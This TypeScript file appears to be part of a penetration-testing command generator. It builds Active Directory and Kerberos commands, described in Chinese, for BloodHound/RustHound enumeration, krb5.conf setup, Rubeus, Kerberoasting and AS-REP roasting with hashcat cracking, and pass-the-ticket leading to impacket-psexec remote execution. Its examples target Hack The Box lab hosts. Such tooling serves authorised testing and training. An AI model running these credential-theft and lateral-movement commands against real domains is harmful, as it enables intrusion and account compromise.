import type { Tool } from '../../types';
import { q, v } from '../../lib/auth';

export const kerberosTools: Tool[] = [
  {
    id: 'bloodhound',
    name: 'BloodHound',
    category: 'kerberos',
    homepage: 'https://github.com/BloodHoundAD/BloodHound',
    description: 'AD 关系图谱分析工具',
    commands: [
      {
        id: 'bloodhound-python',
        title: 'BloodHound Python 采集器',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');
          const dcIP = v(p.dcIP, 'DC_IP');

          let auth = '';
          switch (p.authMode) {
            case 'password':
              auth = `-p ${q(v(p.password, 'PASSWORD'))}`;
              break;
            case 'hash':
              auth = `--hashes :${v(p.ntHash, 'NTHASH')}`;
              break;
            case 'kerberos':
              auth = `-k`;
              break;
            case 'aeskey':
              auth = `--aesKey ${v(p.aesKey, 'AESKEY')} -k`;
              break;
          }

          return `bloodhound-python -u ${user} ${auth} -d ${domain} -ns ${dcIP} -c All --zip`;
        },
      },
      {
        id: 'bloodhound-sharphound',
        title: 'SharpHound (Windows)',
        description: '在目标主机上运行',
        build: (p) => `SharpHound.exe -c All --zipfilename ${v(p.bloodhoundZip, 'OUTPUT.zip')}`,
      },
      {
        id: 'bloodhound-rusthound',
        title: 'RustHound 全量采集 (Rust)',
        description: 'Rust 编写的采集器，比 bloodhound-python 快得多；-u 需要 user@domain 格式，-z 打包 zip 直接导入 BloodHound',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          const user = v(p.username, 'USER');

          switch (p.authMode) {
            case 'password': {
              return `rusthound -d ${domain} -i ${v(p.dcIP, 'DC_IP')} -u ${q(`${user}@${domain}`)} -p ${q(v(p.password, 'PASSWORD'))} -o rusthound_out -z`;
            }
            case 'kerberos':
            case 'aeskey': {
              return `export KRB5CCNAME=${v(p.ccachePath, 'ticket.ccache')}\nrusthound -d ${domain} -f ${v(p.dcFQDN, 'DC_FQDN')} -k -o rusthound_out -z`;
            }
            case 'hash': {
              return `# RustHound (g0h4n v1) 不支持 PtH，先用 NT 哈希换 TGT 再走 Kerberos:\nimpacket-getTGT ${domain}/${user} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}\nexport KRB5CCNAME=${user}.ccache\nrusthound -d ${domain} -f ${v(p.dcFQDN, 'DC_FQDN')} -k -o rusthound_out -z`;
            }
          }
        },
        usage: `语法: rusthound -d <DOMAIN> [-u user@domain -p pass | -k] [-i DC_IP | -f DC_FQDN] [选项]
  -d, --domain       目标域 (必填), 如 DOMAIN.LOCAL
  -u, --ldapusername LDAP 用户名, 必须是 user@domain.local 格式
  -p, --ldappassword LDAP 密码
  -k, --kerberos     Kerberos 认证, 从 KRB5CCNAME 指向的 ccache 取凭据 (需 -f 指定 DC FQDN)
  -i, --ldapip       域控 IP;-f, --ldapfqdn  域控 FQDN (二选一, Kerberos 模式用 -f)
  -o, --output       JSON 输出目录 (默认 ./)
  -z, --zip          将 JSON 打包为 zip (可直接拖入 BloodHound)
  -n, --name-server  指定 DNS 服务器;--dns-tcp  DNS 走 TCP;--ldaps 强制 LDAPS
说明: RustHound (g0h4n v1) 输出兼容原版 BloodHound;无 -H 选项, 只有哈希时
先 impacket-getTGT 换 ccache 再用 -k。采集 BloodHound CE 数据可改用其分支
rusthound-ce (cargo install rusthound-ce, 支持 -c All/DCOnly 与 -H PtH)。`,
        example: "rusthound -d rebound.htb -i 10.10.11.231 -u 'jjones@rebound.htb' -p 'Password123' -o rusthound_out -z",
      },
      {
        id: 'bloodhound-rusthound-dconly',
        title: 'RustHound 仅 DC 采集 (--dc-only)',
        description: '只从域控采集目录数据，不触碰成员机、跳过 CA 安全检查，速度快流量小',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          if (p.authMode === 'kerberos' || p.authMode === 'aeskey') {
            return `export KRB5CCNAME=${v(p.ccachePath, 'ticket.ccache')}\nrusthound -d ${domain} -f ${v(p.dcFQDN, 'DC_FQDN')} -k --dc-only -o rusthound_out -z`;
          }
          return `rusthound -d ${domain} -i ${v(p.dcIP, 'DC_IP')} -u ${q(`${v(p.username, 'USER')}@${domain}`)} -p ${q(v(p.password, 'PASSWORD'))} --dc-only -o rusthound_out -z`;
        },
        usage: `--dc-only  仅从域控采集 (用户/组/计算机/GPO/OU/信任等目录对象),
不连接成员服务器, 也不做 CA 安全配置与 Web Enrollment 检查,
适合大域快速出图; 缺点是没有本地管理员/会话等主机侧边。`,
        example: "rusthound -d rebound.htb -i 10.10.11.231 -u 'jjones@rebound.htb' -p 'Password123' --dc-only -o rusthound_out -z",
      },
      {
        id: 'bloodhound-rusthound-adcs',
        title: 'RustHound ADCS 采集 (--adcs)',
        description: '枚举证书模板/CA 等 ADCS 对象，输出供 @ly4k 的 BloodHound PKI 分支使用',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          if (p.authMode === 'kerberos' || p.authMode === 'aeskey') {
            return `export KRB5CCNAME=${v(p.ccachePath, 'ticket.ccache')}\nrusthound -d ${domain} -f ${v(p.dcFQDN, 'DC_FQDN')} -k --adcs -o rusthound_adcs -z`;
          }
          return `rusthound -d ${domain} -i ${v(p.dcIP, 'DC_IP')} -u ${q(`${v(p.username, 'USER')}@${domain}`)} -p ${q(v(p.password, 'PASSWORD'))} --adcs -o rusthound_adcs -z`;
        },
        usage: `--adcs            枚举证书模板、证书颁发机构及其他 ADCS 配置,
  输出适配 @ly4k 带 PKI 支持的 BloodHound 分支
  --old-bloodhound  仅配合 --adcs: 输出兼容原版 BloodHound (无 PKI 节点)
  --dc-only         可叠加, 跳过 CA 安全/注册接口检查
ESC 系列漏洞分析建议直接配合 Certipy (见左侧 Certipy 分类)。`,
        example: "rusthound -d rebound.htb -i 10.10.11.231 -u 'jjones@rebound.htb' -p 'Password123' --adcs --old-bloodhound -o rusthound_adcs -z",
      },
    ],
  },
  {
    id: 'krb5conf',
    name: 'krb5.conf 配置',
    category: 'kerberos',
    homepage: 'https://web.mit.edu/kerberos/krb5-latest/doc/admin/conf_files/krb5_conf.html',
    description: '生成 /etc/krb5.conf，让 kinit 与各工具的 -k Kerberos 认证能正确定位 KDC',
    guide: `为什么需要 krb5.conf:
  impacket/NetExec 的 -k、ldapsearch 的 GSSAPI、Evil-WinRM 的 kerberos 模式等,
  底层都调用系统 Kerberos 库 (MIT krb5), 它通过 /etc/krb5.conf 把域名映射到
  KDC。没有正确配置时会出现 "Cannot find KDC for realm" / "KDC has no support
  for encryption type" 等错误, 或票据请求被发往错误的 KDC。
关键点:
  [libdefaults]  default_realm 设为大写域名; dns_lookup_* 关闭避免 DNS 污染
  [realms]       每个 REALM 声明 kdc / admin_server (DC FQDN 或 IP)
  [domain_realm] 把主机域名后缀映射到 REALM (前导点表示包含子域)
  REALM 约定全大写; 域名与主机名大小写敏感, 保持与目标实际一致。
验证: 写好后 kinit USER@REALM 成功且 klist 能看到 TGT 即配置正确。`,
    commands: [
      {
        id: 'krb5conf-write',
        title: '生成并覆盖 /etc/krb5.conf',
        description: 'heredoc 一次性写入完整配置：libdefaults + realms + domain_realm',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          const realm = domain.toUpperCase();
          const lower = domain.toLowerCase();
          const kdc = p.dcFQDN?.trim() || p.dcIP?.trim() || '<DC_HOST>';
          const hostLine = p.dcFQDN?.trim() ? `\n    ${p.dcFQDN.trim()} = ${realm}` : '';
          return `sudo tee /etc/krb5.conf > /dev/null <<'EOF'
[libdefaults]
    default_realm = ${realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    ${realm} = {
        kdc = ${kdc}
        admin_server = ${kdc}
    }

[domain_realm]
    .${lower} = ${realm}
    ${lower} = ${realm}${hostLine}
EOF`;
        },
        usage: `说明: 用 heredoc 经 sudo tee 覆盖写入 /etc/krb5.conf (原有配置会备份提示:
sudo cp /etc/krb5.conf /etc/krb5.conf.bak)。
  default_realm     默认 REALM, 填大写域名, kinit 不指定 realm 时使用
  dns_lookup_realm/kdc = false  关闭 DNS 发现, 只信本文件 (防 DNS 投毒带偏)
  ticket_lifetime   票据有效期; forwardable 允许票据转发 (委派场景需要)
  [realms] 块       kdc/admin_server 填 DC FQDN (需 /etc/hosts 可解析) 或 IP
  [domain_realm]    主机名后缀 -> REALM 映射; 已填写 DC FQDN 时会额外加一条
                    该主机的映射, 确保对 DC 本身的 Kerberos 请求也命中 REALM`,
        example: `sudo tee /etc/krb5.conf > /dev/null <<'EOF'
[libdefaults]
    default_realm = REBOUND.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    REBOUND.HTB = {
        kdc = dc01.rebound.htb
        admin_server = dc01.rebound.htb
    }

[domain_realm]
    .rebound.htb = REBOUND.HTB
    rebound.htb = REBOUND.HTB
    dc01.rebound.htb = REBOUND.HTB
EOF`,
      },
      {
        id: 'krb5conf-append',
        title: '追加 Realm 到现有配置',
        description: '多域/多林场景：保留系统现有配置，只追加新的 realms 与 domain_realm 映射',
        build: (p) => {
          const domain = v(p.domain, 'DOMAIN');
          const realm = domain.toUpperCase();
          const lower = domain.toLowerCase();
          const kdc = p.dcFQDN?.trim() || p.dcIP?.trim() || '<DC_HOST>';
          const hostLine = p.dcFQDN?.trim() ? `\n    ${p.dcFQDN.trim()} = ${realm}` : '';
          return `sudo tee -a /etc/krb5.conf > /dev/null <<'EOF'

[realms]
    ${realm} = {
        kdc = ${kdc}
        admin_server = ${kdc}
    }

[domain_realm]
    .${lower} = ${realm}
    ${lower} = ${realm}${hostLine}
EOF`;
        },
        usage: `说明: tee -a 追加而非覆盖, 适合已配置过其他域 (如 HTB 多机环境) 的情况。
注意: krb5.conf 允许重复的 [realms]/[domain_realm] 段, 后出现的块会与先出现的
合并, 但同一 REALM 重复定义时以先出现者为准——追加前确认该 REALM 未被定义过,
否则应改用覆盖模式或手动编辑。`,
        example: `sudo tee -a /etc/krb5.conf > /dev/null <<'EOF'

[realms]
    REBOUND.HTB = {
        kdc = dc01.rebound.htb
        admin_server = dc01.rebound.htb
    }

[domain_realm]
    .rebound.htb = REBOUND.HTB
    rebound.htb = REBOUND.HTB
    dc01.rebound.htb = REBOUND.HTB
EOF`,
      },
      {
        id: 'krb5conf-hosts',
        title: '写入 /etc/hosts 解析 DC',
        description: 'Kerberos 按 SPN 匹配主机名，krb5.conf 用 FQDN 时必须先保证主机名可解析',
        build: (p) => {
          const lower = v(p.domain, 'DOMAIN').toLowerCase();
          return `echo '${v(p.dcIP, 'DC_IP')} ${v(p.dcFQDN, 'DC_FQDN')} ${lower}' | sudo tee -a /etc/hosts`;
        },
        usage: `说明: krb5.conf 的 kdc 若填 FQDN (推荐, Kerberos 票据按主机名签发),
系统必须能解析该主机名, 否则 kinit 报 "Cannot resolve KDC"。
格式: <IP> <FQDN> <短域名>, 一行可同时给 DC FQDN 和域本身做解析。
排查: getent hosts <DC_FQDN> 能返回 IP 即解析正常。`,
        example: "echo '10.10.11.231 dc01.rebound.htb rebound.htb' | sudo tee -a /etc/hosts",
      },
    ],
  },
  {
    id: 'kerberos-tools',
    name: 'Kerberos 工具',
    category: 'kerberos',
    homepage: 'https://web.mit.edu/kerberos/',
    description: 'Kerberos 票据操作',
    commands: [
      {
        id: 'kinit',
        title: 'kinit 获取 TGT',
        build: (p) => `kinit ${v(p.username, 'USER')}@${v(p.domain, 'DOMAIN').toUpperCase()}`,
      },
      {
        id: 'klist',
        title: 'klist 查看票据',
        build: () => `klist`,
      },
      {
        id: 'kdestroy',
        title: 'kdestroy 销毁票据',
        build: () => `kdestroy`,
      },
      {
        id: 'krb5-ccache-export',
        title: '导出 TGT 环境变量',
        description: '用于 Impacket 工具的 -k 参数',
        build: (p) => `export KRB5CCNAME=${v(p.ccachePath, 'CCACHE_PATH')}`,
      },
    ],
  },
  {
    id: 'rubeus',
    name: 'Rubeus',
    category: 'kerberos',
    homepage: 'https://github.com/GhostPack/Rubeus',
    description: 'Windows Kerberos 攻击工具',
    commands: [
      {
        id: 'rubeus-kerberoast',
        title: 'Rubeus Kerberoasting',
        build: () => `Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt`,
      },
      {
        id: 'rubeus-asreproast',
        title: 'Rubeus AS-REP Roasting',
        build: () => `Rubeus.exe asreproast /outfile:asrep_hashes.txt`,
      },
      {
        id: 'rubeus-tgtdeleg',
        title: 'Rubeus 提取 TGT (tgtdeleg)',
        build: () => `Rubeus.exe tgtdeleg`,
      },
      {
        id: 'rubeus-ptt',
        title: 'Rubeus Pass-the-Ticket',
        build: () => `Rubeus.exe ptt /ticket:ticket.kirbi`,
      },
    ],
  },
  {
    id: 'kerberos-attack-flow',
    name: 'Kerberos 攻击流程',
    category: 'kerberos',
    description: '常见 Kerberos 攻击完整流程说明',
    commands: [
      {
        id: 'kerberoast-flow',
        title: 'Kerberoasting 完整流程',
        description: '1. 枚举 SPN -> 2. 请求 TGS -> 3. 离线破解',
        build: (p) => `# 1. 枚举 SPN\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${q(v(p.password, 'PASSWORD'))} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 请求票据\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${q(v(p.password, 'PASSWORD'))} -dc-ip ${v(p.dcIP, 'DC_IP')} -request -outputfile hashes.txt\n\n# 3. hashcat 破解\nhashcat -m 13100 hashes.txt wordlist.txt`,
      },
      {
        id: 'asrep-flow',
        title: 'AS-REP Roasting 完整流程',
        description: '1. 枚举无预认证用户 -> 2. 离线破解',
        build: (p) => `# 1. 枚举\nimpacket-GetNPUsers ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -dc-ip ${v(p.dcIP, 'DC_IP')} -format hashcat -outputfile asrep.txt\n\n# 2. hashcat 破解\nhashcat -m 18200 asrep.txt wordlist.txt`,
      },
      {
        id: 'ptt-flow',
        title: 'Pass-the-Ticket 完整流程',
        description: '1. 获取 TGT -> 2. 设置环境变量 -> 3. 使用票据',
        build: (p) => `# 1. 获取 TGT\nimpacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 设置环境变量\nexport KRB5CCNAME=${v(p.username, 'USER')}.ccache\n\n# 3. 使用 Kerberos 认证执行命令\nimpacket-psexec ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}@${v(p.targetHost, 'TARGET')} -k -no-pass`,
      },
    ],
  },
];
